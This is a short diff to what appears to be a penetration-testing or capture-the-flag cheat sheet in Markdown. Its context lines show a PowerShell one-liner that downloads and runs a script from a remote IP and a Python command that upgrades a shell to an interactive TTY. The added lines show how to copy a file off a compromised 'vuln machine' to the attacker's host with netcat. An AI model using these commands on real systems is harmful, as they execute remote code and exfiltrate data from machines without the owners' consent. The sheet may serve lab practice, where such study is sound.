@@ -44,3 +44,10 @@ powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.12.81:8000
 ```shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
+### How to download file using netcat
+```shell
+# In your machine
+nc -lnvp 6666 > file
+# In vuln machine
+nc -w 3 <your ip> 6666 < file
+```
